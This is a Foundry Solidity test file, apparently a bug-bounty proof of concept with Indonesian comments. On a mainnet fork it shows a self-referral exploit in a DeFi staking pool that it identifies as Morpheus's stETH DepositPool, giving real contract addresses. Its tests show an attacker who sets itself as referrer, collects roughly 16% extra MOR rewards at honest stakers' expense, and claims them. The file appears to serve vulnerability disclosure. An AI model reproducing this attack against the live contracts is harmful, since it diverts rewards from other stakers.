// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";

interface IStETH {
    function submit(address referral) external payable returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IAggregator {
    function latestRoundData()
        external
        view
        returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound);
    function decimals() external view returns (uint8);
}

interface IDepositPool {
    function stake(uint256 rewardPoolIndex_, uint256 amount_, uint128 claimLockEnd_, address referrer_) external;
    function claim(uint256 rewardPoolIndex_, address receiver_) external payable;
    function claimReferrerTier(uint256 rewardPoolIndex_, address receiver_) external payable;
    function getLatestUserReward(uint256 rewardPoolIndex_, address user_) external view returns (uint256);
    function getLatestReferrerReward(uint256 rewardPoolIndex_, address user_) external view returns (uint256);
    function getReferrerMultiplier(uint256 rewardPoolIndex_, address referrer_) external view returns (uint256);
    function usersData(
        address user_,
        uint256 rewardPoolIndex_
    )
        external
        view
        returns (
            uint128 lastStake,
            uint256 deposited,
            uint256 rate,
            uint256 pendingRewards,
            uint128 claimLockStart,
            uint128 claimLockEnd,
            uint256 virtualDeposited,
            uint128 lastClaim,
            address referrer
        );
    function rewardPoolsData(
        uint256 rewardPoolIndex_
    ) external view returns (uint128 lastUpdate, uint256 rate, uint256 totalVirtualDeposited);
}

interface IDistributor {
    function distributeRewards(uint256 rewardPoolIndex_) external;
}

/// @notice PoC: self-referral di DepositPool (stETH, reward pool 0).
/// @dev Fork ETH mainnet block 26426498. Tidak ada tx mainnet, tidak ada private key.
///      Chainlink aggregator (di luar scope) di-mock HANYA untuk updatedAt setelah vm.warp,
///      dengan jawaban harga ASLI dari fork block — simulasi oracle yang tetap hidup.
///      Semua kontrak Morpheus yang diuji adalah bytecode deployed asli.
contract EthCapitalSelfReferralPoC is Test {
    address constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address constant STETH_POOL = 0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790;
    address constant DIST = 0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A;

    // Chainlink feeds (di luar scope program; hanya updatedAt-nya yang di-mock setelah warp)
    address constant FEED_STETH_USD = 0xCfE54B5cD566aB89272946F602D76Ea879CAb4a8;
    address constant FEED_ETH_USD = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;
    address constant FEED_WBTC_BTC = 0xfdFD9C85aD200c506Cf9e21F1FD8dd01932FBB23;
    address constant FEED_BTC_USD = 0xF4030086522a5bEEa4988F8cA5B36dbC97BeE88c;
    address constant FEED_USDC_USD = 0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6;
    address constant FEED_USDT_USD = 0x3E7d1eAB13ad0104d2750B8863b489D65364e32D;

    address attacker = address(0xA77A);
    address honest = address(0xB0B5);

    uint256 constant STAKE = 100 ether; // 100 stETH

    function setUp() public {
        vm.createSelectFork("mainnet", 26426498);
        vm.deal(attacker, 1000 ether);
        vm.deal(honest, 1000 ether);
        vm.prank(attacker);
        IStETH(STETH).submit{value: STAKE}(address(0));
        vm.prank(honest);
        IStETH(STETH).submit{value: STAKE}(address(0));
        // stETH untuk simulasi yield (lihat _warpAndDistribute)
        vm.deal(address(this), 100 ether);
        IStETH(STETH).submit{value: 10 ether}(address(0));
    }

    /// @dev Simulasikan oracle Chainlink yang tetap update setelah warp: jawaban harga ASLI,
    ///      hanya updatedAt yang dimajukan ke block.timestamp saat ini.
    function _refreshOracleMocks() internal {
        address[6] memory feeds = [
            FEED_STETH_USD,
            FEED_ETH_USD,
            FEED_WBTC_BTC,
            FEED_BTC_USD,
            FEED_USDC_USD,
            FEED_USDT_USD
        ];
        for (uint256 i = 0; i < feeds.length; i++) {
            (uint80 rid, int256 ans, uint256 started, , uint80 air) = IAggregator(feeds[i]).latestRoundData();
            vm.mockCall(
                feeds[i],
                abi.encodeWithSelector(IAggregator.latestRoundData.selector),
                abi.encode(rid, ans, started, block.timestamp, air)
            );
        }
    }

    function _stakeBoth(address attackerRef, address honestRef) internal {
        vm.prank(attacker);
        IStETH(STETH).approve(DIST, STAKE);
        vm.prank(attacker);
        IDepositPool(STETH_POOL).stake(0, STAKE, 0, attackerRef);

        vm.prank(honest);
        IStETH(STETH).approve(DIST, STAKE);
        vm.prank(honest);
        IDepositPool(STETH_POOL).stake(0, STAKE, 0, honestRef);
    }

    function _warpAndDistribute() internal {
        vm.warp(block.timestamp + 31 days);
        // Di mainnet, saldo stETH Distributor tumbuh otomatis via rebase Lido (~3.5% APY
        // atas 3582 stETH = ~10.6 stETH / 31 hari) dan aToken tumbuh via bunga Aave.
        // Di fork, warp tidak memicu rebase/bunga, jadi totalYield == 0 dan reward
        // masuk undistributedRewards. Donasi 10 stETH nyata ke Distributor mensimulasikan
        // yield rebase tersebut (peran yang sama persis dalam accounting yield).
        IStETH(STETH).transfer(DIST, 10 ether);
        _refreshOracleMocks();
        IDistributor(DIST).distributeRewards(0);
    }

    function _totals(
        address user
    ) internal view returns (uint256 userRw, uint256 refRw, uint256 virtualDep) {
        userRw = IDepositPool(STETH_POOL).getLatestUserReward(0, user);
        refRw = IDepositPool(STETH_POOL).getLatestReferrerReward(0, user);
        (,,,,,, virtualDep,,) = IDepositPool(STETH_POOL).usersData(user, 0);
    }

    /// @notice KONTROL: dua user stake identik, keduanya jujur (tanpa referrer).
    ///         Total reward keduanya harus (hampir) sama.
    function testControlBothHonest() public {
        _stakeBoth(address(0), address(0));
        _warpAndDistribute();
        (uint256 aU, uint256 aR, uint256 aV) = _totals(attacker);
        (uint256 hU, uint256 hR, uint256 hV) = _totals(honest);
        console.log("CONTROL attacker total:", aU + aR, "virtual:", aV);
        console.log("CONTROL honest   total:", hU + hR, "virtual:", hV);
        // rasio harus ~1.00 (toleransi 1% untuk dust stETH)
        assertGe((aU + aR) * 100, (hU + hR) * 99);
        assertLe((aU + aR) * 100, (hU + hR) * 101);
    }

    /// @notice SERANGAN: attacker stake 100 stETH dengan referrer = dirinya sendiri.
    ///         Honest stake 100 stETH tanpa referrer. Keduanya lock & jumlah identik.
    ///         Attacker mendapat user reward (bonus 1%) + referrer reward (tier 3 = 15%),
    ///         total ~16% lebih banyak — didanai dari dilusi staker lain.
    function testSelfReferralDrainsOthers() public {
        _stakeBoth(attacker, address(0));
        (, uint256 aDep,,,,, uint256 aV,,) = IDepositPool(STETH_POOL).usersData(attacker, 0);
        (,,,,,, uint256 hV,,) = IDepositPool(STETH_POOL).usersData(honest, 0);
        console.log("ATTACK attacker virtual:", aV, "(100 stETH * 1.01 user bonus)");
        console.log("ATTACK honest   virtual:", hV, "(100 stETH * 1.00)");
        console.log(
            "ATTACK attacker referrer multiplier (1e25=100%):",
            IDepositPool(STETH_POOL).getReferrerMultiplier(0, attacker)
        );
        assertEq(aV, (aDep * 101) / 100, "attacker user virtual should be 1.01x of deposited");

        _warpAndDistribute();
        (uint256 aU, uint256 aR, ) = _totals(attacker);
        (uint256 hU, uint256 hR, ) = _totals(honest);
        uint256 attTotal = aU + aR;
        uint256 honTotal = hU + hR;
        console.log("ATTACK attacker user reward    :", aU);
        console.log("ATTACK attacker referrer reward:", aR);
        console.log("ATTACK attacker TOTAL          :", attTotal);
        console.log("ATTACK honest   user reward    :", hU);
        console.log("ATTACK honest   referrer reward:", hR);
        console.log("ATTACK honest   TOTAL          :", honTotal);
        console.log("ATTACK ratio attacker/honest (bps):", (attTotal * 10000) / honTotal);

        // Kerugian terukur: attacker dengan stake & lock IDENTIK mendapat >=15% lebih banyak MOR
        // daripada honest user; selisihnya adalah MOR yang seharusnya menjadi milik staker lain.
        assertGt(attTotal, (honTotal * 115) / 100, "attacker must earn >=15% more than honest");
        assertGt(aR, 0, "attacker referrer reward must be > 0");
    }

    /// @notice DILUSI LANGSUNG: honest user yang sama, stake yang sama, periode yang sama —
    ///         hanya beda apakah attacker self-refer atau tidak. Re-fork ke block yang sama
    ///         untuk mendapat state awal yang identik.
    function testSelfReferralDilutesHonestStaker() public {
        _stakeBoth(address(0), address(0));
        _warpAndDistribute();
        (uint256 hUA, uint256 hRA, ) = _totals(honest);
        uint256 controlHonest = hUA + hRA;

        // Reset ke state fork awal yang identik; hapus mock oracle skenario A
        // (updatedAt-nya 31 hari di masa depan relatif terhadap fork block).
        vm.createSelectFork("mainnet", 26426498);
        vm.clearMockedCalls();
        vm.deal(attacker, 1000 ether);
        vm.deal(honest, 1000 ether);
        vm.prank(attacker);
        IStETH(STETH).submit{value: STAKE}(address(0));
        vm.prank(honest);
        IStETH(STETH).submit{value: STAKE}(address(0));
        vm.deal(address(this), 100 ether);
        IStETH(STETH).submit{value: 10 ether}(address(0));

        _stakeBoth(attacker, address(0));
        _warpAndDistribute();
        (uint256 hUB, uint256 hRB, ) = _totals(honest);
        uint256 attackHonest = hUB + hRB;

        console.log("DILUTION honest total CONTROL:", controlHonest);
        console.log("DILUTION honest total ATTACK :", attackHonest);
        console.log("DILUTION honest LOSS (MOR wei):", controlHonest - attackHonest);
        assertLt(attackHonest, controlHonest, "honest staker must earn LESS when attacker self-refers");
    }

    /// @notice Klaim nyata attacker (user reward + referrer reward) via LayerZero di fork.
    ///         Membuktikan reward yang dihitung memang bisa di-mint menjadi MOR.
    function testAttackerRealClaim() public {
        _stakeBoth(attacker, address(0));
        _warpAndDistribute();
        (uint256 aU, uint256 aR, ) = _totals(attacker);
        console.log("CLAIM attacker pending user+referrer:", aU + aR);

        vm.deal(attacker, 1 ether);
        vm.prank(attacker);
        // claim() user reward; butuh ETH untuk fee LayerZero
        IDepositPool(STETH_POOL).claim{value: 0.1 ether}(0, attacker);
        console.log("CLAIM user claim() SUCCEEDED");

        vm.prank(attacker);
        IDepositPool(STETH_POOL).claimReferrerTier{value: 0.1 ether}(0, attacker);
        console.log("CLAIM referrer claimReferrerTier() SUCCEEDED");
    }
}
